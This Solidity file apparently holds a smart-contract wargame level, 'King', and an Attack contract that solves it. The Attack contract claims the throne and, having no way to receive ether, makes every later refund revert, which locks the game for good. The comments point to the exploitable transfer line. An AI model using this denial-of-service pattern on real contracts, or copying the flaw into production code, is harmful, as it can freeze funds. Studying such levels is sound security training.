// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    //if contract try to refund eth to previous king that is not implement
    //receive function this contract will stuck
    //exploit line
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract Attack{
    King king;
    constructor(King _king)public {
        king= _king;
    }

    function attack()public payable  {
        (bool success,)=address(king).call{value:msg.value /*amount >= prize */ }("");
        require(success,"tx failed");
    }
}